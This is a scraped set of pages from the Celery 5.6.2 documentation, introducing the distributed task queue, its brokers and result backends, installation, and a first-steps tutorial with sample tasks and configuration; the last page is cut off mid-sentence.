[
  {
    "id": 60491561,
    "timestamp": "2026-02-23T00:13:49.248Z",
    "title": "Introduction to Celery — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/getting-started/introduction.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started » Introduction to Celery\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nIntroduction to Celery\n\nWhat’s a Task Queue?\n\nWhat do I need?\n\nGet Started\n\nCelery is…\n\nFeatures\n\nFramework Integration\n\nQuick Jump\n\nInstallation\n\nWhat’s a Task Queue?\n\nTask queues are used as a mechanism to distribute work across threads or machines.\n\nA task queue’s input is a unit of work called a task. Dedicated worker processes constantly monitor task queues for new work to perform.\n\nCelery communicates via messages, usually using a broker to mediate between clients and workers. To initiate a task the client adds a message to the queue, the broker then delivers that message to a worker.\n\nA Celery system can consist of multiple workers and brokers, giving way to high availability and horizontal scaling.\n\nCelery is written in Python, but the protocol can be implemented in any language. In addition to Python there’s node-celery for Node.js, a PHP client, gocelery, gopher-celery for Go, and rusty-celery for Rust.\n\nLanguage interoperability can also be achieved exposing an HTTP endpoint and having a task that requests it (webhooks).\n\nWhat do I need?\n\nVersion Requirements\n\nCelery version 5.5.x runs on:\n\nPython ❨3.8, 3.9, 3.10, 3.11, 3.12, 3.13❩\n\nPyPy3.9+ ❨v7.3.12+❩\n\nIf you’re running an older version of Python, you need to be running an older version of Celery:\n\nPython 3.7: Celery 5.2 or earlier.\n\nPython 3.6: Celery 5.1 or earlier.\n\nPython 2.7: Celery 4.x series.\n\nPython 2.6: Celery series 3.1 or earlier.\n\nPython 2.5: Celery series 3.0 or earlier.\n\nPython 2.4: Celery series 2.2 or earlier..\n\nCelery is a project with minimal funding, so we don’t support Microsoft Windows. Please don’t open any issues related to that platform.\n\nCelery requires a message transport to send and receive messages. The RabbitMQ and Redis broker transports are feature complete, but there’s also support for a myriad of other experimental solutions, including using SQLite for local development.\n\nCelery can run on a single machine, on multiple machines, or even across data centers.\n\nGet Started\n\nIf this is the first time you’re trying to use Celery, or if you haven’t kept up with development in the 3.1 version and are coming from previous versions, then you should read our getting started tutorials:\n\nFirst Steps with Celery\n\nNext Steps\n\nCelery is…\n\nSimple\n\nCelery is easy to use and maintain, and it doesn’t need configuration files.\n\nIt has an active, friendly community you can talk to for support, including a mailing-list and an IRC channel.\n\nHere’s one of the simplest applications you can make:\n\nfrom celery import Celery\n\napp = Celery('hello', broker='amqp://guest@localhost//')\n\n@app.task\ndef hello():\n    return 'hello world'\n\n\nHighly Available\n\nWorkers and clients will automatically retry in the event of connection loss or failure, and some brokers support HA in way of Primary/Primary or Primary/Replica replication.\n\nFast\n\nA single Celery process can process millions of tasks a minute, with sub-millisecond round-trip latency (using RabbitMQ, librabbitmq, and optimized settings).\n\nFlexible\n\nAlmost every part of Celery can be extended or used on its own, Custom pool implementations, serializers, compression schemes, logging, schedulers, consumers, producers, broker transports, and much more.\n\nIt supports\n\nBrokers\n\nRabbitMQ, Redis,\n\nAmazon SQS, and more…\n\nConcurrency\n\nprefork (multiprocessing),\n\nEventlet, gevent\n\nthread (multithreaded)\n\nsolo (single threaded)\n\n\t\n\nResult Stores\n\nAMQP, Redis\n\nMemcached,\n\nSQLAlchemy, Django ORM\n\nApache Cassandra, Elasticsearch, Riak\n\nMongoDB, CouchDB, Couchbase, ArangoDB\n\nAmazon DynamoDB, Amazon S3\n\nMicrosoft Azure Block Blob, Microsoft Azure Cosmos DB\n\nGoogle Cloud Storage\n\nFile system\n\nSerialization\n\npickle, json, yaml, msgpack.\n\nzlib, bzip2 compression.\n\nCryptographic message signing.\n\nFeatures\n\nMonitoring\n\nA stream of monitoring events is emitted by workers and is used by built-in and external tools to tell you what your cluster is doing – in real-time.\n\nRead more….\n\nWork-flows\n\nSimple and complex work-flows can be composed using a set of powerful primitives we call the “canvas”, including grouping, chaining, chunking, and more.\n\nRead more….\n\nTime & Rate Limits\n\nYou can control how many tasks can be executed per second/minute/hour, or how long a task can be allowed to run, and this can be set as a default, for a specific worker or individually for each task type.\n\nRead more….\n\n\t\n\nScheduling\n\nYou can specify the time to run a task in seconds or a datetime, or you can use periodic tasks for recurring events based on a simple interval, or Crontab expressions supporting minute, hour, day of week, day of month, and month of year.\n\nRead more….\n\nResource Leak Protection\n\nThe --max-tasks-per-child option is used for user tasks leaking resources, like memory or file descriptors, that are simply out of your control.\n\nRead more….\n\nUser Components\n\nEach worker component can be customized, and additional components can be defined by the user. The worker is built up using “bootsteps” — a dependency graph enabling fine grained control of the worker’s internals.\n\nFramework Integration\n\nCelery is easy to integrate with web frameworks, some of them even have integration packages:\n\nPyramid\n\n\t\n\nhttps://pypi.org/project/pyramid_celery/\n\n\n\n\nPylons\n\n\t\n\nhttps://pypi.org/project/celery-pylons/\n\n\n\n\nFlask\n\n\t\n\nnot needed\n\n\n\n\nweb2py\n\n\t\n\nhttps://pypi.org/project/web2py-celery/\n\n\n\n\nTornado\n\n\t\n\nhttps://pypi.org/project/tornado-celery/\n\n\n\n\nTryton\n\n\t\n\nhttps://pypi.org/project/celery_tryton/\n\nFor Django see First steps with Django.\n\nThe integration packages aren’t strictly necessary, but they can make development easier, and sometimes they add important hooks like closing database connections at fork(2).\n\nQuick Jump\n\nI want to ⟶\n\nget the return value of a task\n\nuse logging from my task\n\nlearn about best practices\n\ncreate a custom task base class\n\nadd a callback to a group of tasks\n\nsplit a task into several chunks\n\noptimize the worker\n\nsee a list of built-in task states\n\ncreate custom task states\n\nset a custom task name\n\ntrack when a task starts\n\nretry a task when it fails\n\nget the id of the current task\n\n\t\n\nknow what queue a task was delivered to\n\nsee a list of running workers\n\npurge all messages\n\ninspect what the workers are doing\n\nsee what tasks a worker has registered\n\nmigrate tasks to a new broker\n\nsee a list of event message types\n\ncontribute to Celery\n\nlearn about available configuration settings\n\nget a list of people and companies using Celery\n\nwrite my own remote control command\n\nchange worker queues at runtime\n\nJump to ⟶\n\nBrokers\n\nApplications\n\nTasks\n\nCalling\n\n\t\n\nWorkers\n\nDaemonizing\n\nMonitoring\n\nOptimizing\n\n\t\n\nSecurity\n\nRouting\n\nConfiguration\n\nDjango\n\n\t\n\nContributing\n\nSignals\n\nFAQ\n\nAPI Reference\n\nInstallation\n\nYou can install Celery either via the Python Package Index (PyPI) or from source.\n\nTo install using pip:\n\n$ pip install -U Celery\n\nBundles\n\nCelery also defines a group of bundles that can be used to install Celery and the dependencies for a given feature.\n\nYou can specify these in your requirements or on the pip command-line by using brackets. Multiple bundles can be specified by separating them by commas.\n\n$ pip install \"celery[librabbitmq]\"\n\n$ pip install \"celery[librabbitmq,redis,auth,msgpack]\"\n\n\nThe following bundles are available:\n\nSerializers\ncelery[auth]:\n\nfor using the auth security serializer.\n\ncelery[msgpack]:\n\nfor using the msgpack serializer.\n\ncelery[yaml]:\n\nfor using the yaml serializer.\n\nConcurrency\ncelery[eventlet]:\n\nfor using the https://pypi.org/project/eventlet/ pool.\n\ncelery[gevent]:\n\nfor using the https://pypi.org/project/gevent/ pool.\n\nTransports and Backends\ncelery[librabbitmq]:\n\nfor using the librabbitmq C library.\n\ncelery[redis]:\n\nfor using Redis as a message transport or as a result backend.\n\ncelery[sqs]:\n\nfor using Amazon SQS as a message transport (experimental).\n\ncelery[tblib]:\n\nfor using the task_remote_tracebacks feature.\n\ncelery[memcache]:\n\nfor using Memcached as a result backend (using https://pypi.org/project/pylibmc/)\n\ncelery[pymemcache]:\n\nfor using Memcached as a result backend (pure-Python implementation).\n\ncelery[cassandra]:\n\nfor using Apache Cassandra/Astra DB as a result backend with DataStax driver.\n\ncelery[couchbase]:\n\nfor using Couchbase as a result backend.\n\ncelery[arangodb]:\n\nfor using ArangoDB as a result backend.\n\ncelery[elasticsearch]:\n\nfor using Elasticsearch as a result backend.\n\ncelery[riak]:\n\nfor using Riak as a result backend.\n\ncelery[dynamodb]:\n\nfor using AWS DynamoDB as a result backend.\n\ncelery[zookeeper]:\n\nfor using Zookeeper as a message transport.\n\ncelery[sqlalchemy]:\n\nfor using SQLAlchemy as a result backend (supported).\n\ncelery[pyro]:\n\nfor using the Pyro4 message transport (experimental).\n\ncelery[slmq]:\n\nfor using the SoftLayer Message Queue transport (experimental).\n\ncelery[consul]:\n\nfor using the Consul.io Key/Value store as a message transport or result backend (experimental).\n\ncelery[django]:\n\nspecifies the lowest version possible for Django support.\n\nYou should probably not use this in your requirements, it’s here for informational purposes only.\n\ncelery[gcs]:\n\nfor using the Google Cloud Storage as a result backend (experimental).\n\ncelery[gcpubsub]:\n\nfor using the Google Cloud Pub/Sub as a message transport (experimental)..\n\nDownloading and installing from source\n\nDownload the latest version of Celery from PyPI:\n\nhttps://pypi.org/project/celery/\n\nYou can install it by doing the following,:\n\n$ tar xvfz celery-0.0.0.tar.gz\n$ cd celery-0.0.0\n$ python setup.py build\n# python setup.py install\n\n\nThe last command must be executed as a privileged user if you aren’t currently using a virtualenv.\n\nUsing the development version\nWith pip\n\nThe Celery development version also requires the development versions of https://pypi.org/project/kombu/, https://pypi.org/project/amqp/, https://pypi.org/project/billiard/, and https://pypi.org/project/vine/.\n\nYou can install the latest snapshot of these using the following pip commands:\n\n$ pip install https://github.com/celery/celery/zipball/main#egg=celery\n$ pip install https://github.com/celery/billiard/zipball/main#egg=billiard\n$ pip install https://github.com/celery/py-amqp/zipball/main#egg=amqp\n$ pip install https://github.com/celery/kombu/zipball/main#egg=kombu\n$ pip install https://github.com/celery/vine/zipball/main#egg=vine\n\nWith git\n\nPlease see the Contributing section.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nGetting Started\n\nNext topic\n\nBackends and Brokers\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started » Introduction to Celery\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491560,
    "timestamp": "2026-02-23T00:13:49.249Z",
    "title": "Getting Started — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/getting-started/index.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nGetting Started\nRelease:\n\n5.6\n\nDate:\n\nJan 04, 2026\n\nIntroduction to Celery\nWhat’s a Task Queue?\nWhat do I need?\nGet Started\nCelery is…\nFeatures\nFramework Integration\nQuick Jump\nInstallation\nBackends and Brokers\nBroker Instructions\nBroker Overview\nSummaries\nFirst Steps with Celery\nChoosing a Broker\nInstalling Celery\nApplication\nRunning the Celery worker server\nCalling the task\nKeeping Results\nConfiguration\nWhere to go from here\nTroubleshooting\nNext Steps\nUsing Celery in your Application\nCalling Tasks\nCanvas: Designing Work-flows\nRouting\nRemote Control\nTimezone\nOptimization\nWhat to do now?\nResources\nGetting Help\nSocial Media\nBug tracker\nContributing\nLicense\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nCopyright\n\nNext topic\n\nIntroduction to Celery\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491559,
    "timestamp": "2026-02-23T00:13:49.249Z",
    "title": "Celery - Distributed Task Queue — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/",
    "text": "index\nmodules |\nnext |\nCelery 5.6.2 documentation » Celery - Distributed Task Queue\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nCelery - Distributed Task Queue\n\nCelery is a simple, flexible, and reliable distributed system to process vast amounts of messages, while providing operations with the tools required to maintain such a system.\n\nIt’s a task queue with focus on real-time processing, while also supporting task scheduling.\n\nCelery has a large and diverse community of users and contributors, don’t hesitate to ask questions or get involved.\n\nCelery is Open Source and licensed under the BSD License.\n\nOpen Collective is our community-powered funding platform that fuels Celery’s ongoing development. Your sponsorship directly supports improvements, maintenance, and innovative features that keep Celery robust and reliable.\n\nGetting Started\n\nIf you’re new to Celery you can get started by following the First Steps with Celery tutorial.\n\nYou can also check out the FAQ.\n\nContents\nCopyright\nGetting Started\nIntroduction to Celery\nBackends and Brokers\nFirst Steps with Celery\nNext Steps\nResources\nUser Guide\nApplication\nTasks\nCalling Tasks\nCanvas: Designing Work-flows\nWorkers Guide\nDaemonization\nPeriodic Tasks\nRouting Tasks\nMonitoring and Management Guide\nSecurity\nOptimizing\nDebugging\nConcurrency\nSignals\nTesting with Celery\nExtensions and Bootsteps\nConfiguration and defaults\nDocumenting Tasks with Sphinx\nDjango\nContributing\nCommunity Resources\nTutorials\nFrequently Asked Questions\nChange history\nAPI Reference\nInternals\nHistory\nGlossary\nIndices and tables\n\nIndex\n\nModule Index\n\nSearch Page\n\nDonations\n\nPlease help support this community project with a donation.\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nCelery 5.6.2 documentation » Celery - Distributed Task Queue\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491562,
    "timestamp": "2026-02-23T00:13:49.259Z",
    "title": "Backends and Brokers — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/getting-started/backends-and-brokers/index.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started » Backends and Brokers\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nBackends and Brokers\nRelease:\n\n5.6\n\nDate:\n\nJan 04, 2026\n\nCelery supports several message transport alternatives.\n\nBroker Instructions\nUsing RabbitMQ\nUsing Redis\nUsing Amazon SQS\nUsing Kafka\nUsing Google Pub/Sub\nBroker Overview\n\nThis is comparison table of the different transports supports, more information can be found in the documentation for each individual transport (see Broker Instructions).\n\nName\n\n\t\n\nStatus\n\n\t\n\nMonitoring\n\n\t\n\nRemote Control\n\n\n\n\nRabbitMQ\n\n\t\n\nStable\n\n\t\n\nYes\n\n\t\n\nYes\n\n\n\n\nRedis\n\n\t\n\nStable\n\n\t\n\nYes\n\n\t\n\nYes\n\n\n\n\nAmazon SQS\n\n\t\n\nStable\n\n\t\n\nNo\n\n\t\n\nNo\n\n\n\n\nZookeeper\n\n\t\n\nExperimental\n\n\t\n\nNo\n\n\t\n\nNo\n\n\n\n\nKafka\n\n\t\n\nExperimental\n\n\t\n\nNo\n\n\t\n\nNo\n\n\n\n\nGC PubSub\n\n\t\n\nExperimental\n\n\t\n\nYes\n\n\t\n\nYes\n\nExperimental brokers may be functional but they don’t have dedicated maintainers.\n\nMissing monitor support means that the transport doesn’t implement events, and as such Flower, celery events, celerymon and other event-based monitoring tools won’t work.\n\nRemote control means the ability to inspect and manage workers at runtime using the celery inspect and celery control commands (and other tools using the remote control API).\n\nSummaries\n\nNote: This section is not comprehensive of backends and brokers.\n\nCelery has the ability to communicate and store with many different backends (Result Stores) and brokers (Message Transports).\n\nRedis\n\nRedis can be both a backend and a broker.\n\nAs a Broker: Redis works well for rapid transport of small messages. Large messages can congest the system.\n\nSee documentation for details\n\nAs a Backend: Redis is a super fast K/V store, making it very efficient for fetching the results of a task call. As with the design of Redis, you do have to consider the limit memory available to store your data, and how you handle data persistence. If result persistence is important, consider using another DB for your backend.\n\nRabbitMQ\n\nRabbitMQ is a broker.\n\nAs a Broker: RabbitMQ handles larger messages better than Redis, however if many messages are coming in very quickly, scaling can become a concern and Redis or SQS should be considered unless RabbitMQ is running at very large scale.\n\nSee documentation for details\n\nAs a Backend: RabbitMQ can store results via rpc:// backend. This backend creates separate temporary queue for each client.\n\nNote: RabbitMQ (as the broker) and Redis (as the backend) are very commonly used together. If more guaranteed long-term persistence is needed from the result store, consider using PostgreSQL or MySQL (through SQLAlchemy), Cassandra, or a custom defined backend.\n\nSQS\n\nSQS is a broker.\n\nIf you already integrate tightly with AWS, and are familiar with SQS, it presents a great option as a broker. It is extremely scalable and completely managed, and manages task delegation similarly to RabbitMQ. It does lack some of the features of the RabbitMQ broker such as worker remote control commands.\n\nSee documentation for details\n\nSQLAlchemy\n\nSQLAlchemy is a backend.\n\nIt allows Celery to interface with MySQL, PostgreSQL, SQlite, and more. It is an ORM, and is the way Celery can use a SQL DB as a result backend.\n\nSee documentation for details\n\nGCPubSub\n\nGoogle Cloud Pub/Sub is a broker.\n\nIf you already integrate tightly with Google Cloud, and are familiar with Pub/Sub, it presents a great option as a broker. It is extremely scalable and completely managed, and manages task delegation similarly to RabbitMQ.\n\nSee documentation for details\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nIntroduction to Celery\n\nNext topic\n\nUsing RabbitMQ\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started » Backends and Brokers\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491563,
    "timestamp": "2026-02-23T00:13:49.260Z",
    "title": "First Steps with Celery — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/getting-started/first-steps-with-celery.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started » First Steps with Celery\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nFirst Steps with Celery\n\nCelery is a task queue with batteries included. It’s easy to use so that you can get started without learning the full complexities of the problem it solves. It’s designed around best practices so that your product can scale and integrate with other languages, and it comes with the tools and support you need to run such a system in production.\n\nIn this tutorial you’ll learn the absolute basics of using Celery.\n\nLearn about:\n\nChoosing and installing a message transport (broker).\n\nInstalling Celery and creating your first task.\n\nStarting the worker and calling tasks.\n\nKeeping track of tasks as they transition through different states, and inspecting return values.\n\nCelery may seem daunting at first - but don’t worry - this tutorial will get you started in no time. It’s deliberately kept simple, so as to not confuse you with advanced features. After you have finished this tutorial, it’s a good idea to browse the rest of the documentation. For example the Next Steps tutorial will showcase Celery’s capabilities.\n\nChoosing a Broker\n\nRabbitMQ\n\nRedis\n\nOther brokers\n\nInstalling Celery\n\nApplication\n\nRunning the Celery worker server\n\nCalling the task\n\nKeeping Results\n\nConfiguration\n\nWhere to go from here\n\nTroubleshooting\n\nWorker doesn’t start: Permission Error\n\nResult backend doesn’t work or tasks are always in PENDING state\n\nChoosing a Broker\n\nCelery requires a solution to send and receive messages; usually this comes in the form of a separate service called a message broker.\n\nThere are several choices available, including:\n\nRabbitMQ\n\nRabbitMQ is feature-complete, stable, durable and easy to install. It’s an excellent choice for a production environment. Detailed information about using RabbitMQ with Celery:\n\nUsing RabbitMQ\n\nIf you’re using Ubuntu or Debian install RabbitMQ by executing this command:\n\n$ sudo apt-get install rabbitmq-server\n\n\nOr, if you want to run it on Docker execute this:\n\n$ docker run -d -p 5672:5672 rabbitmq\n\n\nWhen the command completes, the broker will already be running in the background, ready to move messages for you: Starting rabbitmq-server: SUCCESS.\n\nDon’t worry if you’re not running Ubuntu or Debian, you can go to this website to find similarly simple installation instructions for other platforms, including Microsoft Windows:\n\nhttp://www.rabbitmq.com/download.html\n\nRedis\n\nRedis is also feature-complete, but is more susceptible to data loss in the event of abrupt termination or power failures. Detailed information about using Redis:\n\nUsing Redis\n\nIf you want to run it on Docker execute this:\n\n$ docker run -d -p 6379:6379 redis\n\nOther brokers\n\nIn addition to the above, there are other experimental transport implementations to choose from, including Amazon SQS.\n\nSee Broker Overview for a full list.\n\nInstalling Celery\n\nCelery is on the Python Package Index (PyPI), so it can be installed with standard Python tools like pip:\n\n$ pip install celery\n\nApplication\n\nThe first thing you need is a Celery instance. We call this the Celery application or just app for short. As this instance is used as the entry-point for everything you want to do in Celery, like creating tasks and managing workers, it must be possible for other modules to import it.\n\nIn this tutorial we keep everything contained in a single module, but for larger projects you want to create a dedicated module.\n\nLet’s create the file tasks.py:\n\nfrom celery import Celery\n\napp = Celery('tasks', broker='pyamqp://guest@localhost//')\n\n@app.task\ndef add(x, y):\n    return x + y\n\n\nThe first argument to Celery is the name of the current module. This is only needed so that names can be automatically generated when the tasks are defined in the __main__ module.\n\nThe second argument is the broker keyword argument, specifying the URL of the message broker you want to use. Here we are using RabbitMQ (also the default option).\n\nSee Choosing a Broker above for more choices – for RabbitMQ you can use amqp://localhost, or for Redis you can use redis://localhost.\n\nYou defined a single task, called add, returning the sum of two numbers.\n\nRunning the Celery worker server\n\nYou can now run the worker by executing our program with the worker argument:\n\n$ celery -A tasks worker --loglevel=INFO\n\n\nNote\n\nSee the Troubleshooting section if the worker doesn’t start.\n\nIn production you’ll want to run the worker in the background as a daemon. To do this you need to use the tools provided by your platform, or something like supervisord (see Daemonization for more information).\n\nFor a complete listing of the command-line options available, do:\n\n$  celery worker --help\n\n\nThere are also several other commands available, and help is also available:\n\n$ celery --help\n\nCalling the task\n\nTo call our task you can use the delay() method.\n\nThis is a handy shortcut to the apply_async() method that gives greater control of the task execution (see Calling Tasks):\n\n>>> from tasks import add\n>>> add.delay(4, 4)\n\n\nThe task has now been processed by the worker you started earlier. You can verify this by looking at the worker’s console output.\n\nCalling a task returns an AsyncResult instance. This can be used to check the state of the task, wait for the task to finish, or get its return value (or if the task failed, to get the exception and traceback).\n\nResults are not enabled by default. In order to do remote procedure calls or keep track of task results in a database, you will need to configure Celery to use a result backend. This is described in the next section.\n\nKeeping Results\n\nIf you want to keep track of the tasks’ states, Celery needs to store or send the states somewhere. There are several built-in result backends to choose from: SQLAlchemy/Django ORM, MongoDB, Memcached, Redis, RPC (RabbitMQ/AMQP), and – or you can define your own.\n\nFor this example we use the rpc result backend, that sends states back as transient messages. The backend is specified via the backend argument to Celery, (or via the result_backend setting if you choose to use a configuration module). So, you can modify this line in the tasks.py file to enable the rpc:// backend:\n\napp = Celery('tasks', backend='rpc://', broker='pyamqp://')\n\n\nOr if you want to use Redis as the result backend, but still use RabbitMQ as the message broker (a popular combination):\n\napp = Celery('tasks', backend='redis://localhost', broker='pyamqp://')\n\n\nTo read more about result backends please see Result Backends.\n\nNow with the result backend configured, restart the worker, close the current python session and import the tasks module again to put the changes into effect. This time you’ll hold on to the AsyncResult instance returned when you call a task:\n\n>>> from tasks import add    # close and reopen to get updated 'app'\n>>> result = add.delay(4, 4)\n\n\nThe ready() method returns whether the task has finished processing or not:\n\n>>> result.ready()\nFalse\n\n\nYou can wait for the result to complete, but this is rarely used since it turns the asynchronous call into a synchronous one:\n\n>>> result.get(timeout=1)\n8\n\n\nIn case the task raised an exception, get() will re-raise the exception, but you can override this by specifying the propagate argument:\n\n>>> result.get(propagate=False)\n\n\nIf the task raised an exception, you can also gain access to the original traceback:\n\n>>> result.traceback\n\n\nWarning\n\nBackends use resources to store and transmit results. To ensure that resources are released, you must eventually call get() or forget() on EVERY AsyncResult instance returned after calling a task.\n\nSee celery.result for the complete result object reference.\n\nConfiguration\n\nCelery, like a consumer appliance, doesn’t need much configuration to operate. It has an input and an output. The input must be connected to a broker, and the output can be optionally connected to a result backend. However, if you look closely at the back, there’s a lid revealing loads of sliders, dials, and buttons: this is the configuration.\n\nThe default configuration should be good enough for most use cases, but there are many options that can be configured to make Celery work exactly as needed. Reading about the options available is a good idea to familiarize yourself with what can be configured. You can read about the options in the Configuration and defaults reference.\n\nThe configuration can be set on the app directly or by using a dedicated configuration module. As an example you can configure the default serializer used for serializing task payloads by changing the task_serializer setting:\n\napp.conf.task_serializer = 'json'\n\n\nIf you’re configuring many settings at once you can use update:\n\napp.conf.update(\n    task_serializer='json',\n    accept_content=['json'],  # Ignore other content\n    result_serializer='json',\n    timezone='Europe/Oslo',\n    enable_utc=True,\n)\n\n\nFor larger projects, a dedicated configuration module is recommended. Hard coding periodic task intervals and task routing options is discouraged. It is much better to keep these in a centralized location. This is especially true for libraries, as it enables users to control how their tasks behave. A centralized configuration will also allow your SysAdmin to make simple changes in the event of system trouble.\n\nYou can tell your Celery instance to use a configuration module by calling the app.config_from_object() method:\n\napp.config_from_object('celeryconfig')\n\n\nThis module is often called “celeryconfig”, but you can use any module name.\n\nIn the above case, a module named celeryconfig.py must be available to load from the current directory or on the Python path. It could look something like this:\n\nceleryconfig.py:\n\nbroker_url = 'pyamqp://'\nresult_backend = 'rpc://'\n\ntask_serializer = 'json'\nresult_serializer = 'json'\naccept_content = ['json']\ntimezone = 'Europe/Oslo'\nenable_utc = True\n\n\nTo verify that your configuration file works properly and doesn’t contain any syntax errors, you can try to import it:\n\n$ python -m celeryconfig\n\n\nFor a complete reference of configuration options, see Configuration and defaults.\n\nTo demonstrate the power of configuration files, this is how you’d route a misbehaving task to a dedicated queue:\n\nceleryconfig.py:\n\ntask_routes = {\n    'tasks.add': 'low-priority',\n}\n\n\nOr instead of routing it you could rate limit the task instead, so that only 10 tasks of this type can be processed in a minute (10/m):\n\nceleryconfig.py:\n\ntask_annotations = {\n    'tasks.add': {'rate_limit': '10/m'}\n}\n\n\nIf you’re using RabbitMQ or Redis as the broker then you can also direct the workers to set a new rate limit for the task at runtime:\n\n$ celery -A tasks control rate_limit tasks.add 10/m\nworker@example.com: OK\n    new rate limit set successfully\n\n\nSee Routing Tasks to read more about task routing, and the task_annotations setting for more about annotations, or Monitoring and Management Guide for more about remote control commands and how to monitor what your workers are doing.\n\nWhere to go from here\n\nIf you want to learn more you should continue to the Next Steps tutorial, and after that you can read the User Guide.\n\nTroubleshooting\n\nThere’s also a troubleshooting section in the Frequently Asked Questions.\n\nWorker doesn’t start: Permission Error\n\nIf you’re using Debian, Ubuntu or other Debian-based distributions:\n\nDebian recently renamed the /dev/shm special file to /run/shm.\n\nA simple workaround is to create a symbolic link:\n\n# ln -s /run/shm /dev/shm\n\n\nOthers:\n\nIf you provide any of the --pidfile, --logfile or --statedb arguments, then you must make sure that they point to a file or directory that’s writable and readable by the user starting the worker.\n\nResult backend doesn’t work or tasks are always in PENDING state\n\nAll tasks are PENDING by default, so the state would’ve been better named “unknown”. Celery doesn’t update the state when a task is sent, and any task with no history is assumed to be pending (you know the task id, after all).\n\nMake sure that the task doesn’t have ignore_result enabled.\n\nEnabling this option will force the worker to skip updating states.\n\nMake sure the task_ignore_result setting isn’t enabled.\n\nMake sure that you don’t have any old workers still running.\n\nIt’s easy to start multiple workers by accident, so make sure that the previous worker is properly shut down before you start a new one.\n\nAn old worker that isn’t configured with the expected result backend may be running and is hijacking the tasks.\n\nThe --pidfile argument can be set to an absolute path to make sure this doesn’t happen.\n\nMake sure the client is configured with the right backend.\n\nIf, for some reason, the client is configured to use a different backend than the worker, you won’t be able to receive the result. Make sure the backend is configured correctly:\n\n>>> result = task.delay()\n>>> print(result.backend)\n\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nUsing Google Pub/Sub\n\nNext topic\n\nNext Steps\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started » First Steps with Celery\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491564,
    "timestamp": "2026-02-23T00:13:49.260Z",
    "title": "Next Steps — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/getting-started/next-steps.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Getting Started » Next Steps\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nNext Steps\n\nThe First Steps with Celery guide is intentionally minimal. In this guide I’ll demonstrate what Celery offers in more detail, including how to add Celery support for your application and library.\n\nThis document doesn’t document all of Celery’s features and best practices, so it’s recommended that you also read the User Guide\n\nUsing Celery in your Application\n\nCalling Tasks\n\nCanvas: Designing Work-flows\n\nRouting\n\nRemote Control\n\nTimezone\n\nOptimization\n\nWhat to do now?\n\nUsing Celery in your Application\nOur Project\n\nProject layout:\n\nsrc/\n    proj/__init__.py\n        /celery.py\n        /tasks.py\n\nproj/celery.py\nfrom celery import Celery\n\napp = Celery('proj',\n             broker='amqp://',\n             backend='rpc://',\n             include=['proj.tasks'])\n\n# Optional configuration, see the application user guide.\napp.conf.update(\n    result_expires=3600,\n)\n\nif __name__ == '__main__':\n    app.start()\n\n\nIn this module you created our Celery instance (sometimes referred to as the app). To use Celery within your project you simply import this instance.\n\nThe broker argument specifies the URL of the broker to use.\n\nSee Choosing a Broker for more information.\n\nThe backend argument specifies the result backend to use.\n\nIt’s used to keep track of task state and results. While results are disabled by default I use the RPC result backend here because I demonstrate how retrieving results work later. You may want to use a different backend for your application. They all have different strengths and weaknesses. If you don’t need results, it’s better to disable them. Results can also be disabled for individual tasks by setting the @task(ignore_result=True) option.\n\nSee Keeping Results for more information.\n\nThe include argument is a list of modules to import when the worker starts. You need to add our tasks module here so that the worker is able to find our tasks.\n\nproj/tasks.py\nfrom .celery import app\n\n\n@app.task\ndef add(x, y):\n    return x + y\n\n\n@app.task\ndef mul(x, y):\n    return x * y\n\n\n@app.task\ndef xsum(numbers):\n    return sum(numbers)\n\nStarting the worker\n\nThe celery program can be used to start the worker (you need to run the worker in the directory above proj, according to the example project layout the directory is src):\n\n$ celery -A proj worker -l INFO\n\n\nWhen the worker starts you should see a banner and some messages:\n\n--------------- celery@halcyon.local v4.0 (latentcall)\n--- ***** -----\n-- ******* ---- [Configuration]\n- *** --- * --- . broker:      amqp://guest@localhost:5672//\n- ** ---------- . app:         __main__:0x1012d8590\n- ** ---------- . concurrency: 8 (processes)\n- ** ---------- . events:      OFF (enable -E to monitor this worker)\n- ** ----------\n- *** --- * --- [Queues]\n-- ******* ---- . celery:      exchange:celery(direct) binding:celery\n--- ***** -----\n\n[2012-06-08 16:23:51,078: WARNING/MainProcess] celery@halcyon.local has started.\n\n\n– The broker is the URL you specified in the broker argument in our celery module. You can also specify a different broker on the command-line by using the -b option.\n\n– Concurrency is the number of prefork worker process used to process your tasks concurrently. When all of these are busy doing work, new tasks will have to wait for one of the 